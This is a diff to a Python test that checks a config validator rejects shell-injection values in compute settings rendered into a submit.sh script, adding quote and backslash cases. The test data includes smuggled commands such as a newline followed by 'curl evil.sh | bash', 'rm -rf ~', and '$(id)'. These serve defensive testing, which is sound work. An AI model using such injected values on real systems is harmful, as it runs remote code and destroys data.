@@ -1721,7 +1721,8 @@ nextflow_config: nextflow.awsbatch.config
         """compute.partition/time/cpus/mem are rendered verbatim into submit.sh's directive
         lines; a line break there is a new, executing line (0042 review round 2, MAJ-3)."""
         for key in ("compute.partition", "compute.time", "compute.cpus", "compute.mem"):
-            for bad in ("cpu\ncurl evil.sh | bash", "cpu\rrm -rf ~", "$(id)", "`id`"):
+            for bad in ("cpu\ncurl evil.sh | bash", "cpu\rrm -rf ~", "$(id)", "`id`",
+                        'cpu"x', "cpu\\x"):
                 fails = []
                 self.wl.check_config_common({key: bad}, (), fails)
                 self.assertTrue(any(key in f["detail"] for f in fails),
